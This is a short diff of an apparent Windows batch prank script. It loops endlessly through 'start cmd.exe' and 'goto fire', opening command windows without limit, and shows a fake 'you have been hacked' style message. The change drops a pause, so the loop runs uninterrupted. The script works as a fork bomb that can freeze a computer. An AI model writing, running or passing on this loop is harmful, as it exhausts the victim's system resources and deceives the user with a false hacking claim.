@@ -5,6 +5,5 @@ goto fire
 :fire
 color 2
 start cmd.exe
-echo "Sorry, You have been hacked.....?"
-pause
+echo "Sorry, but you made mistake..........."
 goto fire
